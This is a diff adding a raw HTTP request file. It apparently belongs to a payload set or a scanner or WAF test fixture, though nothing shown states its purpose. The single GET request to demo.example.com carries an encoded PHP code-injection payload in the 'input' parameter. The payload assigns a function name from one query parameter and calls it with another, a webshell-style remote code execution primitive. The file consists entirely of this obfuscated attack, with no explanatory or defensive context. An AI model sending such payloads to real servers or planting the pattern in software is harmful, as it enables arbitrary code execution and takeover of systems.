@@ -1,0 +1,4 @@
+GET /a?input=$f%3D$_GET[%26%2339;f%26%2339;];$f($_GET[%26%2339;a%26%2339;]); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
